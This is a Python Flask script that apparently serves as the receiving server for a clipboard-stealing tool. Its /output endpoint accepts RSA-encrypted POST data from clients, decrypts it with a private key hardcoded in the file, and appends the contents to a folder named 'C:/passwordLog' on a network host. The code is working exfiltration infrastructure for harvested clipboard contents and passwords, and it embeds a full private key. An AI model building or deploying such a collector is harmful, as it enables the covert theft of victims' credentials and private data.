import os
import random

from flask import Flask, request
import rsa

app = Flask(__name__) #creates an instance of this

private = rsa.PrivateKey(22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257, 65537, 18904456802470234824674927585062739262175469540803341693025941052595268144806665898422832716151487524635194142258103048312997879077729152309271137541740363936094507015463071332300051490866404513161999202023556335958428242004950337753785686251150575484519597348437296515458507316352672148738308018604157351282327135493334495208537739362528863390211788632973323282898369170600992460840532717461147061007678346560712666798234316549552213240997248654432337026554529632433844992820728939550947936210228506561925974836406580040346322388721026455387043468932665609393794642715044192787742698558843503697610331035873617448973, 3311650058923074433241761864350234503213807126645929143772285621970103494195237265961704171263185554006226681975906911122622520882547127729873631157599066062170239050481487082307461223800648903976985296928144636087187688165667959862738308221176887817236903575118606623233247962337526959867243134862835356895802384627466949691807, 6885359967348204868366348467251138224886830616623836093746572209690471511384096796925844021145669543211268616522599313018121948324860526790119636847235011604661913324962194125071677623861514250184120923402448367624991396416753896664091399371168163582064357632376888614310129037687340469351)

#Sets up the routing so that when someone navigates to the local host with the correct port /output this is triggered
#Also is specified to take in post requests
"""
get_output receives the post request from the client and proccesses the data in that file. It adds the data in that file
to a file on the server so then the server has a copy of all the clipboard_data
"""
@app.route("/output", methods=["POST"])
def get_output():
    global private
    #files is a dictionary and the file is stored under the key file. We get the file using get
    #clipboard_info_file = request.files.get('file')

    #TODO: create the filepath on the computer...
    #Reference: https://stackoverflow.com/questions/5104957/how-do-i-create-a-file-at-a-specific-path
    filepath = os.path.join('C:/passwordLog', 'server_stored_clipboard_info')
    if not os.path.exists('C:/passwordLog'):
        os.makedirs('C:/passwordLog')


    #Opens a file on the server side and sets it to write mode. If the file does not exist then write will create the
    #file in write mode
    server_clipboard_file = open(filepath, "a")

    #goes through every line in the file received from the clientserver
    #for line in clipboard_info_file:
        #decodes each line since it is in binary, and then writes it to the server_clipboard_file server_clipboard_file
        #s = line.decode()
    #its currently binary data
    #decodes as binary data
    s = request.data
    s = rsa.decrypt(s, private).decode('utf8')
    server_clipboard_file.write(s + '\n')

    #post returns something so we return thanks
    s = random.randint(1, 1000)
    return str(s)

def main():
    #Starts a server on the local host on port 12345
    app.run(host="10.168.3.254", port=80)

    #TODO: fix ost and port number...

main()